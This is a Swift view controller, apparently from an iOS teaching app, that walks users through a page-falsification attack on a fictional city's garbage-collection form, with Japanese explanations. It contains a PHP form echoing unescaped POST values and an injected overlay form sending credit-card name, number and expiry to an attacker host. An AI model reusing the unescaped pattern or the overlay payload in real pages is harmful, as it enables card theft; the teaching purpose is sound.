import UIKit

class FalsifyFormUnsafeWebSimulatorViewController: WebSimulatorViewController {
    
    let trapA = A()
    let div = Div()
    let oldTitleH1 = H1()
    let newTitleH1 = H1()
    let oldForm = Form()
    let oldNameText = Text()
    let oldNameInput = Input()
    let newForm = Form()
    let newNameText = Text()
    let newNameInput = Input()
    let numberText = Text()
    let numberInput = Input()
    let expirationText = Text()
    let expirationInput = Input()
    let applyButton = Button()
    
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupViews()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        //showTrap()
        showApply()
    }
    
    private func setupViews() {
        trapA.set(text: "脆弱市の粗大ゴミ改修費用がクレジットカードで支払えるようになりました!!これは便利です!!")
        trapA.set(code: "<input\n style=\"cursor:pointer;text-decoration:underline;color:blue;border:none;background:transparent;font-size:100%;\"\n type=\"submit\"\n value=\"脆弱市の粗大ゴミ改修費用がクレジットカードで支払えるようになりました!!これは便利です!!\"\n>", language: .html)
        trapA.button.addTarget(self, action: #selector(handleDisabledTrapA(_:)), for: .touchUpInside)
        oldTitleH1.set(text: "脆弱市 粗大ゴミ申し込みページ")
        newTitleH1.set(text: "脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。")
        div.set(code:"""
<h1>脆弱市 粗大ゴミ申し込みページ</h1>
<form method="post" action="confirm.php">
    氏名: <input type="text" name="name" value="<?php echo $_POST["name"]; ?>"><br>
    住所: <input type="text" name="address" value="<?php echo $_POST["address"]; ?>"><br>
    電話番号: <input type="number" name="tel" value="<?php echo $_POST["tel"]; ?>"><br>
    品目: <input type="text" name="item" value="<?php echo $_POST["item"]; ?>"><br>
    数量: <input type="number" name="num" value="<?php echo $_POST["num"]; ?>"><br>
    <input type="submit" value="申し込む">
</form>
""", language: .php, force: false)
        div.codeLabel.positionX = .right
        div.codeLabel.positionY = .top
        oldNameText.set(text: "名前:")
        newForm.set(code: "<form method=\"post\" action=\"http://www.trap.co.jp/send_mail.php\"\n  style=\"position:absolute;top:5px;left:5px;background-color:white;\">\n    <h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1><br>\n    カード名義: <input type=\"text\" name=\"name\"><br><br>\n    カード番号: <input type=\"text\" name=\"card_number\"><br><br>\n    有効期限: <input type=\"text\"\n    name=\"expiration_date\"><br><br>\n    <input type=\"submit\" value=\"申し込む\">\n</form>", language: .html)
        newForm.codeLabel.positionX = .right
        newForm.codeLabel.positionY = .top
        newNameText.set(text: "カード名義:")
        numberText.set(text: "カード番号:")
        expirationText.set(text: "有効期限:")
        applyButton.set(text: "申し込む")
    }
    
    private func showTrap() {
//        body.margin = UIEdgeInsets(top: 8, left: 8, bottom: 8, right: 8)
        body.clear()
        body.append(element: trapA)
        clearGuideSections()
        appendGuideSection([GuideText(text: "これが攻撃者が用意した罠サイトです。")])
        appendGuideSection([
            GuideText(text: "この赤枠で囲まれた<input>要素をタップすると脆弱なWebページに遷移します。", programingLanguages: [.html]),
            GuideText(text: "<input>要素の下に示したコードを見てください。\n本来は<input>要素なのでこのような見た目にはなりませんが、style属性で設定した値によって<a>要素のように見えています。\nこれによりユーザが罠に気付くのは困難になってしまっています。", programingLanguages: [.html]),
            GuideText(text: "この<input>要素をタップすることによって送信される値によって新たに追加される<form>要素を以下に示します。\n見切れている部分はスクロールすることで最後まで見ることが可能です。\n<form method=\"post\" action=\"send_mail.php\" style=\"position:absolute;top:5px;left:5px;background-color:white;\">\n    <h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1><br>\n    カード名義: <input type=\"text\" name=\"name\"><br><br>\n    カード番号: <input type=\"text\" name=\"card_number\"><br><br>\n    有効期限: <input type=\"text\" name=\"expiration_date\"><br><br>\n    <input type=\"submit\" value=\"申し込む\">\n</form>", programingLanguages: [.html])
            ],
                           onEnter: { completion in
                            self.focus(on: self.trapA) {
                                completion?()
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.trapA) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "これを踏まえた上で実際に<input>要素をタップして、脆弱なWebページに遷移してみましょう", programingLanguages: [.html])
            ],
                           onEnter: { completion in
                            self.trapA.button.removeTarget(self, action: #selector(self.handleDisabledTrapA(_:)), for: .touchUpInside)
                            self.trapA.button.addTarget(self, action: #selector(self.handleEnabledTrapA(_:)), for: .touchUpInside)
                            completion?()
                            
        })
        removeCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    private func showApply() {
        div.frame.size.width = body.safeAreaLayoutGuide.layoutFrame.width
        oldForm.frame.size.width = body.safeAreaLayoutGuide.layoutFrame.width
        newForm.frame.size.width = body.safeAreaLayoutGuide.layoutFrame.width
        body.clear()
        oldForm.append(element: oldNameText)
        oldForm.append(element: oldNameInput)
        div.append(element: oldTitleH1)
        div.append(element: oldForm)
        newForm.append(element: newTitleH1)
        newForm.append(element: newNameText)
        newForm.append(element: newNameInput)
        newForm.appendBreak()
        newForm.appendBreak()
        newForm.append(element: numberText)
        newForm.append(element: numberInput)
        newForm.appendBreak()
        newForm.appendBreak()
        newForm.append(element: expirationText)
        newForm.append(element: expirationInput)
        newForm.appendBreak()
        newForm.appendBreak()
        newForm.append(element: applyButton)
        body.append(element: div)
        body.seekToTop()
        body.append(element: newForm)
        clearGuideSections()
        appendGuideSection([
            GuideText(text: "これがHTMLの改ざんが行われた後の脆弱なWebページです。")
            ])
        appendGuideSection([
            GuideText(text: "この赤枠で囲まれた部分が攻撃者によって新たに追加された<form>要素です。\n<form>要素の右横に示したコードと見比べてみましょう。\nこの<form>要素はユーザのクレジットカード情報を盗むために攻撃者が追加したものですが、本来このWebページは粗大ゴミの回収を申し込むためのページでした。", programingLanguages: [.html]),
            GuideText(text: "なぜ元々あった<form>要素が見えなくなっているのかというと、以下の設定により新たに追加された<form>要素が元々あった<form>要素を覆い隠すように配置され、さらに<body>要素と同じ背景色である白を設定することにより完全に塗り潰されてしまったためです。\nstyle=\"position:absolute;top:5px;left:5px;background-color:white;\"", programingLanguages: [.html]),
            ],
                           onEnter: { completion in
                            self.focus(on: self.newForm) {
                                completion?()
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.newForm) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "これを確認するために新たに追加された<form>要素を透明にしてみます。\n", programingLanguages: [.html]),
            GuideText(text: "新たに追加された<form>要素の下に元々あった<h1>要素と<form>要素が確認できます。", programingLanguages: [.html])
            ],
                           onEnter: { completion in
                            UIView.animate(withDuration: 1, animations: {
                                self.newForm.alpha = 0
                            }) { _ in
                                self.focus(on: self.div) {
                                    completion?()
                                }
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.div) {
                self.body.scrollView.sendSubviewToBack(self.div)
                UIView.animate(withDuration: 1, animations: {
                    self.newForm.alpha = 1
                }) { _ in
                    completion?()
                }
            }
        })
        addCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    @objc
    private func handleDisabledTrapA(_ sender: UITapGestureRecognizer) {
        NotificationMessage.send(text: "全ての説明文を読むまでは次の画面に遷移できません。", axisX: .right, axisY: .center, size: nil, font: .boldSystemFont(ofSize: 18), textColor: .white, backgroundColor: .red, lifeSeconds: 2)
    }
    
    @objc
    private func handleEnabledTrapA(_ sender: UITapGestureRecognizer) {
        hideGuideMessageCollectionView() {
            self.unfocusAll() {
                self.showApply()
            }
        }
    }
    
}
